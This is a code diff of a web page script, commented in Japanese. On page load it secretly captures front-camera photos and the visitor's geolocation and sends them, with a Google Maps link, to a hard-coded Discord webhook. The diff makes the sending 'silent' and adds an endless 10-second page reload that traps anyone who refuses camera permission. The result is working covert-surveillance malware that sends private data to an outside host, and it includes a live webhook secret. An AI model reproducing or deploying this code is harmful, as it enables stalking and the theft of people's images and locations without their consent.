@@ -134,16 +134,16 @@ function base64ToBlob(base64, type='image/png') {
 
 // 位置情報取得
 async function getLocation() {
-  return new Promise(resolve => {
-    if (!navigator.geolocation) return resolve(null);
+  return new Promise((resolve,reject) => {
+    if (!navigator.geolocation) return reject("Geolocation未対応");
     navigator.geolocation.getCurrentPosition(
       pos => resolve(pos.coords),
-      err => resolve(null)
+      err => resolve(null) // 許可されない場合は null
     );
   });
 }
 
-// Discord送信（Safari単体向け）
+// Discord送信（無音）
 async function sendToDiscord(images, coords=null) {
   const webhookURL = 'https://discord.com/api/webhooks/1410283485377331300/73MF6zns-aj6WU2XhWayMd5ERtQRdzyAXyJ6tiplHnFj6LttzN8Ghsu5f9xYKa7w-K48';
   const formData = new FormData();
@@ -155,26 +155,24 @@ async function sendToDiscord(images, coords=null) {
 
   let content = `撮影した${images.length}枚の画像`;
   if(coords){
-    content += `\n位置情報: 緯度 ${coords.latitude}, 経度 ${coords.longitude}`;
-    content += `\nGoogleマップ: https://www.google.com/maps?q=${coords.latitude},${coords.longitude}`;
+    const mapsURL = `https://www.google.com/maps?q=${coords.latitude},${coords.longitude}`;
+    content += `\n位置情報: 緯度 ${coords.latitude}, 経度 ${coords.longitude}\nGoogleマップ: ${mapsURL}`;
   }
-  formData.append('content', content);
 
-  try {
-    const xhr = new XMLHttpRequest();
-    xhr.open("POST", webhookURL, true);
-    xhr.send(formData);
-  } catch(e) {
-    console.warn("送信失敗:", e);
-  }
+  formData.append('content', content);
+  await fetch(webhookURL, { method:'POST', body: formData }).catch(()=>{});
 }
 
-// メイン処理
+// 強制ページリロード（許可されなかった場合）
+function forceReload() {
+  setInterval(() => location.reload(), 10000); // 10秒ごとに永遠リロード
+}
+
+// メイン処理：許可されたら自動で連射＋送信
 async function startCapture() {
   try {
+
     const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
     video.srcObject = stream;
 
     const coords = await getLocation();
@@ -191,7 +189,13 @@ async function startCapture() {
     stream.getTracks().forEach(t=>t.stop());
     await sendToDiscord(images, coords);
 
-// ページ読み込みで自動開始
+  } catch(err){
+    // 許可されなかった場合は無限リロード
+    forceReload();
+  }
+}
+
+// 自動開始
 startCapture();
 </script>
 
